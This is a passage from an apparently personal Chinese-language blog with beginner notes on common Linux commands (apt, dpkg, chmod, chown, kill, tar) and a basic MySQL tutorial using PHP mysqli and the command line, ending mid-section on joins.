<h6 id="10-修改ip命令"><a href="#10-修改ip命令" class="headerlink" title="10.修改ip命令"></a>10.修改ip命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改网络配置文件，文件地址：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">------------------------------------------------</span><br><span class="line">主要修改以下配置：  </span><br><span class="line">TYPE=Ethernet               //网络类型</span><br><span class="line">BOOTPROTO=static            //静态IP</span><br><span class="line">DEVICE=ens00                //网卡名</span><br><span class="line">IPADDR=192.168.1.100        //设置的IP</span><br><span class="line">NETMASK=255.255.255.0       //子网掩码</span><br><span class="line">GATEWAY=192.168.1.1         //网关</span><br><span class="line">DNS1=192.168.1.1            //DNS</span><br><span class="line">DNS2=8.8.8.8                //备用DNS</span><br><span class="line">ONBOOT=yes                  //系统启动时启动此设置</span><br><span class="line">-------------------------------------------------</span><br><span class="line">修改保存以后使用命令重启网卡：service network restart</span><br></pre></td></tr></table></figure>

<h6 id="11-apt命令（一般跟随sudo进行）"><a href="#11-apt命令（一般跟随sudo进行）" class="headerlink" title="11.apt命令（一般跟随sudo进行）"></a>11.apt命令（一般跟随sudo进行）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install package_name 安装/更新一个新软件包，软件临时存放到/var/cache/apt/archives</span><br><span class="line">apt-cdrom install package_name 从光盘安装/更新一个软件包</span><br><span class="line">apt-get remove packagename #卸载一个已安装的软件包（保留配置文档）</span><br><span class="line">apt-get update 升级列表中的软件包 </span><br><span class="line">apt-get upgrade 升级所有已安装的软件</span><br><span class="line">apt-get clean 从下载的软件包中清理缓存</span><br></pre></td></tr></table></figure>

<h6 id="12-sudo命令"><a href="#12-sudo命令" class="headerlink" title="12.sudo命令"></a>12.sudo命令</h6><p><code>sudo</code>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的<code>root</code>命令的一个工具，如halt，reboot，su等等。换句话说通过此命令可以让非<code>root</code>的用户运行只有<code>root</code>才有权限执行的命令。</p>
<h6 id="13-dpkg命令（使用时需要有deb软件包）"><a href="#13-dpkg命令（使用时需要有deb软件包）" class="headerlink" title="13.dpkg命令（使用时需要有deb软件包）"></a>13.dpkg命令（使用时需要有deb软件包）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i xx.deb  为对应的下载xx.deb软件的命令</span><br><span class="line">sudo dpkg -r xx.deb  为对应的卸载xx.deb软件的命令</span><br><span class="line">sudo dpkg -c xx.deb  显示软件包内文件列表</span><br><span class="line">sudo dpkg -l xx.deb  查询软件包的版本</span><br></pre></td></tr></table></figure>

<p>使用这个命令需要有deb软件包</p>
<p>步骤为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先cd xx.deb</span><br><span class="line">最后下载sudo dpkg -i xx.deb</span><br></pre></td></tr></table></figure>

<h6 id="14-yum命令（ubuntu需配置yum安装源才可使用）"><a href="#14-yum命令（ubuntu需配置yum安装源才可使用）" class="headerlink" title="14.yum命令（ubuntu需配置yum安装源才可使用）"></a>14.yum命令（ubuntu需配置yum安装源才可使用）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install #全部安装</span><br><span class="line">yum update #全部更新</span><br></pre></td></tr></table></figure>

<h6 id="15-在ubuntu上配置git"><a href="#15-在ubuntu上配置git" class="headerlink" title="15.在ubuntu上配置git"></a>15.在ubuntu上配置git</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用sudo apt-get install git进行安装</span><br><span class="line">git --version查看版本</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;你的邮箱地址&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱地址&quot;   该命令获取公钥，一般会存在于/root/.ssh文件中</span><br><span class="line">gedit ~/.ssh/id_rsa.pub     使用该命令查看公钥</span><br><span class="line">复制公钥进行github的上传</span><br><span class="line">git config --list   可查看配置信息</span><br></pre></td></tr></table></figure>

<h6 id="16-ubuntu换源"><a href="#16-ubuntu换源" class="headerlink" title="16.ubuntu换源"></a>16.ubuntu换源</h6><p>先备份镜像源设置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>

<p>再编辑镜像源设置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>最后复制下面的所有内容替换掉原文件中的所有内容（阿里源）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<h6 id="17-root模式"><a href="#17-root模式" class="headerlink" title="17.root模式"></a>17.root模式</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入为su root</span><br><span class="line">退出为快捷键ctrl+d或者输入exit</span><br></pre></td></tr></table></figure>

<h6 id="18-pwd命令（查看目录的绝对路径）"><a href="#18-pwd命令（查看目录的绝对路径）" class="headerlink" title="18.pwd命令（查看目录的绝对路径）"></a>18.pwd命令（查看目录的绝对路径）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd /</span><br></pre></td></tr></table></figure>

<h6 id="19-关机命令"><a href="#19-关机命令" class="headerlink" title="19.关机命令"></a>19.关机命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now 关闭系统</span><br><span class="line">shutdown -r now 重启系统</span><br><span class="line">reboot    重启系统</span><br></pre></td></tr></table></figure>

<h6 id="20-chmod命令（权限管理）"><a href="#20-chmod命令（权限管理）" class="headerlink" title="20.chmod命令（权限管理）"></a>20.chmod命令（权限管理）</h6><p>每个文件都有三个权限分别是r–读，w–写，x–执行，分别对应数字是4，2，1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 764 name即赋予了name文件所有人的全部权限，文件所有组拥有读和写的权限，而其他人只拥有读的权限。</span><br></pre></td></tr></table></figure>

<p>777的第一个7代表user即文件所有人，第二个6代表gourp即文件所有组，第三个4代表other即其他人</p>
<h6 id="21-gdb"><a href="#21-gdb" class="headerlink" title="21.gdb"></a>21.gdb</h6><p>gdb是一种程序调试工具</p>
<h6 id="22-find命令（可寻找文件）"><a href="#22-find命令（可寻找文件）" class="headerlink" title="22.find命令（可寻找文件）"></a>22.find命令（可寻找文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /home -name &quot;*.txt&quot;    为寻找/home里的.txt文件</span><br><span class="line">find -name &quot;*.txt&quot;    为寻找该目录下的.txt文件</span><br></pre></td></tr></table></figure>

<h6 id="23-ps命令"><a href="#23-ps命令" class="headerlink" title="23.ps命令"></a>23.ps命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef         //查看所有正在运行的进程</span><br></pre></td></tr></table></figure>

<h6 id="24-help命令"><a href="#24-help命令" class="headerlink" title="24.help命令"></a>24.help命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令 --help</span><br></pre></td></tr></table></figure>

<h6 id="25-mount命令（挂载）"><a href="#25-mount命令（挂载）" class="headerlink" title="25.mount命令（挂载）"></a>25.mount命令（挂载）</h6><p>linux只能访问根目录里面的东西，如果想要访问根目录以外的东西就需要先”挂载“。</p>
<h6 id="26-tail命令和head命令"><a href="#26-tail命令和head命令" class="headerlink" title="26.tail命令和head命令"></a>26.tail命令和head命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -5 /etc/passwd    #查看后5行内容</span><br><span class="line">head -5     #查看前5行内容</span><br></pre></td></tr></table></figure>

<h6 id="27-chown命令（改变文件的属主）"><a href="#27-chown命令（改变文件的属主）" class="headerlink" title="27.chown命令（改变文件的属主）"></a>27.chown命令（改变文件的属主）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown root /var/run/httpd.pid       /var/run/httpd.pid 的所有者设置 root</span><br><span class="line">chown runoob:runoobgroup file1.txt    将文件 file1.txt 的拥有者设为 runoob，群体的使用者 runoobgroup </span><br><span class="line">chown -R runoob:runoobgroup *       将当前前目录下的所有文件与子目录的拥有者皆设为 runoob，群体的使用者 runoobgroup</span><br></pre></td></tr></table></figure>

<h6 id="28-kill命令（结束进程）"><a href="#28-kill命令（结束进程）" class="headerlink" title="28.kill命令（结束进程）"></a>28.kill命令（结束进程）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill pid       //杀死该pid的进程</span><br><span class="line">kill -9 pid    //强制杀死该进程</span><br></pre></td></tr></table></figure>

<h6 id="29-grep命令"><a href="#29-grep命令" class="headerlink" title="29.grep命令"></a>29.grep命令</h6><p>用于查找文件里符合条件的字符串</p>
<h6 id="30-tar命令"><a href="#30-tar命令" class="headerlink" title="30.tar命令"></a>30.tar命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf test.tar test     将test文件夹打包为test.tar并不压缩</span><br><span class="line">tar -zcvf test.tar.gz test     将test文件打包后以gzip压缩，默认以tar.gz为结尾名称为test.tar.gz</span><br></pre></td></tr></table></figure>

<h6 id="31-more命令和less命令（分屏显示指定文件的内容）"><a href="#31-more命令和less命令（分屏显示指定文件的内容）" class="headerlink" title="31.more命令和less命令（分屏显示指定文件的内容）"></a>31.more命令和less命令（分屏显示指定文件的内容）</h6><h6 id="32-which命令（显示命令的绝对路径）"><a href="#32-which命令（显示命令的绝对路径）" class="headerlink" title="32.which命令（显示命令的绝对路径）"></a>32.which命令（显示命令的绝对路径）</h6>]]></content>
  </entry>
  <entry>
    <title>mysql基础</title>
    <url>/2022/11/15/mysql%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>mysql基础</p>
<span id="more"></span>

<h2 id="通过php来使用mysql"><a href="#通过php来使用mysql" class="headerlink" title="通过php来使用mysql"></a>通过php来使用mysql</h2><p>1.在数据库(database)中都存在着一些表(table),表中还存在一些行，列(column)</p>
<h4 id="2-创建数据库"><a href="#2-创建数据库" class="headerlink" title="2.创建数据库"></a>2.创建数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法CREATE DATABASE 数据库名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);//连接本地数据库</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($con,&#x27;CREATE DATABASE my_db&#x27;);//在本地创建数据库my_db</span><br><span class="line">mysqli_close($con);//关闭本地数据库的连接</span><br></pre></td></tr></table></figure>

<h4 id="3-创建数据库表"><a href="#3-创建数据库表" class="headerlink" title="3.创建数据库表"></a>3.创建数据库表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">CREATE TABLE 表名</span><br><span class="line">(</span><br><span class="line">列名 类型,</span><br><span class="line">column_name2 data_type,</span><br><span class="line">column_name3 data_type,</span><br><span class="line">.......</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);//连接本地数据库</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);//选择数据库</span><br><span class="line">$h=&quot;CREATE TABLE user(    //在数据库中建立一个表，并开创3个列</span><br><span class="line">    firstname varchar(15),</span><br><span class="line">    lastname varchar (15),</span><br><span class="line">    age int</span><br><span class="line">)&quot;;</span><br><span class="line">mysqli_query($con,$h);</span><br><span class="line">mysqli_close($con);//关闭本地数据库的连接</span><br></pre></td></tr></table></figure>

<h4 id="4-向数据库的表中插入数据"><a href="#4-向数据库的表中插入数据" class="headerlink" title="4.向数据库的表中插入数据"></a>4.向数据库的表中插入数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法为第一种</span><br><span class="line">INSERT INTO 表名</span><br><span class="line">VALUES (value1, value2,....)</span><br><span class="line"></span><br><span class="line">第二种</span><br><span class="line">INSERT INTO 表名 (column1, column2,...)</span><br><span class="line">VALUES (value1, value2,....)</span><br><span class="line"></span><br><span class="line">第二种可以规定希望在其中插入数据的列</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);//连接本地数据库</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);//选择数据库</span><br><span class="line">mysqli_query($con,&quot;insert into user (firstname,lastname,age)</span><br><span class="line">values(&#x27;peter&#x27;,&#x27;griffin&#x27;,&#x27;35&#x27;)&quot;);//在表中插入数据</span><br><span class="line">mysqli_close($con);//关闭本地数据库的连接</span><br></pre></td></tr></table></figure>

<h4 id="5-从-MySQL-数据库读取数据"><a href="#5-从-MySQL-数据库读取数据" class="headerlink" title="5.从 MySQL 数据库读取数据"></a>5.从 MySQL 数据库读取数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">类名那使用*是获取表中的全部数据</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&#x27;select * from user&#x27;;//获取表中的全部数据</span><br><span class="line">$y=mysqli_query($con,$h);</span><br><span class="line">while($row=mysqli_fetch_array($y))&#123;</span><br><span class="line">    echo $row[&#x27;firstname&#x27;];//输出firstname这一列的数据</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line">//mysqli_fetch_array()是从结果集中取得一行作为数字数组或关联数组</span><br></pre></td></tr></table></figure>

<h4 id="6-where子句"><a href="#6-where子句" class="headerlink" title="6.where子句"></a>6.where子句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name operator value</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&quot;select * from user where firstname=&#x27;peter&#x27;&quot;;//获取表中peter这一行的数据</span><br><span class="line">$y=mysqli_query($con,$h);</span><br><span class="line">while($row=mysqli_fetch_array($y))&#123;</span><br><span class="line">    echo $row[&#x27;firstname&#x27;];//输出firstname这一列的数据</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line">//mysqli_fetch_array()是从结果集中取得一行作为数字数组或关联数组</span><br></pre></td></tr></table></figure>

<h4 id="7-ORDER-BY-关键词"><a href="#7-ORDER-BY-关键词" class="headerlink" title="7.ORDER BY 关键词"></a>7.ORDER BY 关键词</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">SELECT 列名</span><br><span class="line">FROM 表名</span><br><span class="line">ORDER BY 列名 ASC|DESC  //ASC为升序，DESC为降序，可以省略，省略为升序</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&quot;select * from user order by age&quot;;//按照age进行升序排列</span><br><span class="line">$y=mysqli_query($con,$h);</span><br><span class="line">while($row=mysqli_fetch_array($y))&#123;</span><br><span class="line">    echo $row[&#x27;age&#x27;];//输出age这一列的进行升序后的数据</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line">//mysqli_fetch_array()是从结果集中取得一行作为数字数组或关联数组</span><br></pre></td></tr></table></figure>

<h4 id="8-update更新数据库中的数据"><a href="#8-update更新数据库中的数据" class="headerlink" title="8.update更新数据库中的数据"></a>8.update更新数据库中的数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">UPDATE table_name</span><br><span class="line">SET column1=value, column2=value2,...</span><br><span class="line">WHERE some_column=some_value</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&quot;update user set age=44 where firstname=&#x27;peter&#x27;&quot;;//修改表中peter那一行age的值</span><br><span class="line">mysqli_query($con,$h);</span><br><span class="line">mysqli_close($con);</span><br></pre></td></tr></table></figure>

<h4 id="9-delete删除数据库中的数据"><a href="#9-delete删除数据库中的数据" class="headerlink" title="9.delete删除数据库中的数据"></a>9.delete删除数据库中的数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">DELETE FROM 表名</span><br><span class="line">WHERE some_column = some_value</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&quot;delete from user where age=10&quot;;//删除age=10这一行</span><br><span class="line">mysqli_query($con,$h);</span><br><span class="line">mysqli_close($con);</span><br></pre></td></tr></table></figure>

<h2 id="通过命令行来使用mysql"><a href="#通过命令行来使用mysql" class="headerlink" title="通过命令行来使用mysql"></a>通过命令行来使用mysql</h2><h4 id="1-连接"><a href="#1-连接" class="headerlink" title="1.连接"></a>1.连接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@host]# mysql -u root -p</span><br></pre></td></tr></table></figure>

<h4 id="2-创建数据库-1"><a href="#2-创建数据库-1" class="headerlink" title="2.创建数据库"></a>2.创建数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database 数据库名;</span><br><span class="line"></span><br><span class="line">mysqladmin -u root -p create 数据库名;  //可以在普通用户下出创建数据库</span><br></pre></td></tr></table></figure>

<h4 id="3-删除数据库"><a href="#3-删除数据库" class="headerlink" title="3.删除数据库"></a>3.删除数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database 数据库名;</span><br></pre></td></tr></table></figure>

<h4 id="4-选择数据库"><a href="#4-选择数据库" class="headerlink" title="4.选择数据库"></a>4.选择数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt;show databases;  //可以查看全部数据库</span><br><span class="line">mysql&gt;use 数据库名;  //使用数据库</span><br></pre></td></tr></table></figure>

<h4 id="5-创建数据库表"><a href="#5-创建数据库表" class="headerlink" title="5.创建数据库表"></a>5.创建数据库表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table 表名 (列名 类型，列名 类型);</span><br></pre></td></tr></table></figure>

<h4 id="6-删除数据库表"><a href="#6-删除数据库表" class="headerlink" title="6.删除数据库表"></a>6.删除数据库表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table 表名;</span><br></pre></td></tr></table></figure>

<h4 id="7-向数据库表中插入数据"><a href="#7-向数据库表中插入数据" class="headerlink" title="7.向数据库表中插入数据"></a>7.向数据库表中插入数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into 表名(列名，列名，列名)</span><br><span class="line">values(数据1，数据2，数据3);</span><br></pre></td></tr></table></figure>

<h4 id="8-查询数据"><a href="#8-查询数据" class="headerlink" title="8.查询数据"></a>8.查询数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 limit 2;//这是规定查询数据的条数，2就是查询前2条，1就是查询前1条</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 where name in (&#x27;name1&#x27;,&#x27;name2&#x27;);</span><br><span class="line">//是从name那一列中返回name1和name2这两条记录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where 列名 between 1 and 20;</span><br><span class="line">//是从该列名中选取数据在1到20之间的数</span><br><span class="line">select * from user where 列名 not between 1 and 20;</span><br><span class="line">//是不选取数据在1到20之间的</span><br></pre></td></tr></table></figure>

<h4 id="9-where子句"><a href="#9-where子句" class="headerlink" title="9.where子句"></a>9.where子句</h4><p>这是user表里的数据</p>
<p><img src="/2022/11/15/mysql%E5%9F%BA%E7%A1%80/image-20221023101502689.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where age=&#x27;10&#x27;;</span><br><span class="line">可以筛选出age=10的所有数据</span><br></pre></td></tr></table></figure>

<h4 id="10-update更新"><a href="#10-update更新" class="headerlink" title="10.update更新"></a>10.update更新</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update 表名 set 列名=数据 where 列名=&#x27;&#x27;;</span><br><span class="line">可以修改数据</span><br></pre></td></tr></table></figure>

<h4 id="11-delete语句"><a href="#11-delete语句" class="headerlink" title="11.delete语句"></a>11.delete语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from 表名 [where 列名=&#x27;&#x27;];</span><br><span class="line">如果没有指定where就会将整个表删除</span><br></pre></td></tr></table></figure>

<h4 id="12-like子句"><a href="#12-like子句" class="headerlink" title="12.like子句"></a>12.like子句</h4><p>在like子句中使用百分号%字符来表示任意字符</p>
<p>like可以代替&#x3D;号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 列名 like &quot;%com&quot;</span><br><span class="line">就是从表中搜索带有com的数据</span><br></pre></td></tr></table></figure>

<h4 id="13-union操作符"><a href="#13-union操作符" class="headerlink" title="13.union操作符"></a>13.union操作符</h4><p>UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 [where] union select 列名 from 表名 [where];</span><br><span class="line">如果选取的数据中有一样的数据那只会列出一个，如果想要输出的有重复的数据，那就要使用union all</span><br></pre></td></tr></table></figure>

<h4 id="14-order-by排序"><a href="#14-order-by排序" class="headerlink" title="14.order by排序"></a>14.order by排序</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 类名 from 表名 order by 列名 [ASC/DESC];</span><br><span class="line">//ASC是升序，DESC是降序，如果不表明是升序还是降序，那么默认是升序</span><br></pre></td></tr></table></figure>

<h4 id="15-group-by语句"><a href="#15-group-by语句" class="headerlink" title="15.group by语句"></a>15.group by语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是一个数据库表,名字为employee_tbl</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">| id | name   | date                | signin |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">|  1 | 小明 | 2016-04-22 15:25:33 |      1 |</span><br><span class="line">|  2 | 小王 | 2016-04-20 15:25:47 |      3 |</span><br><span class="line">|  3 | 小丽 | 2016-04-19 15:26:02 |      2 |</span><br><span class="line">|  4 | 小王 | 2016-04-07 15:26:14 |      4 |</span><br><span class="line">|  5 | 小明 | 2016-04-11 15:26:40 |      4 |</span><br><span class="line">|  6 | 小明 | 2016-04-04 15:26:54 |      2 |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用select name ,conunt(*) from employee_tbl group by name;</span><br><span class="line">//会将表按照名字进行分组，并统计每个名字出现的次数</span><br><span class="line">+--------+----------+</span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 小丽 |        1 |</span><br><span class="line">| 小明 |        3 |</span><br><span class="line">| 小王 |        2 |</span><br><span class="line">+--------+----------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用with rollup</span><br><span class="line">select name,SUM(signin) as signin_count from employee_tbl group by name with rollup;</span><br><span class="line">//with rollup可以将数据分组再进行signin的统计相加</span><br><span class="line">+--------+--------------+</span><br><span class="line">| name   | signin_count |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| 小丽 |            2 |</span><br><span class="line">| 小明 |            7 |</span><br><span class="line">| 小王 |            7 |</span><br><span class="line">| NULL   |           16 |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure>

<h4 id="16-连接的使用"><a href="#16-连接的使用" class="headerlink" title="16.连接的使用"></a>16.连接的使用</h4><p>inner join(内连接):获取两个表中字段匹配关系的记录</p>
<p>left join(左连接):获取左表所有记录，即使右表没有对应匹配的记录</p>
<p>right join(右连接):获取右表所有记录，即使左表没有对应匹配的记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcount_tbl表</span><br><span class="line">mysql&gt; SELECT * FROM tcount_tbl;</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| 菜鸟教程  | 10           |</span><br><span class="line">| RUNOOB.COM    | 20           |</span><br><span class="line">| Google        | 22           |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">runoob_tbl表</span><br><span class="line">mysql&gt; SELECT * from runoob_tbl;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 1         | 学习 PHP    | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 2         | 学习 MySQL  | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">| 5         | 学习 C      | FK            | 2017-04-05      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br></pre></td></tr></table></figure>

<p>使用inner join</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a.runoob_id,a.runoob_author,b.runoob_count from runoob_tbl a inner join tcount_tbl b on a.runoob_author=b.runoob_author;</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| 1           | 菜鸟教程    | 10             |</span><br><span class="line">| 2           | 菜鸟教程    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">+-------------+-----------------+----------------+</span><br></pre></td></tr></table></figure>

<p>使用left join</p>
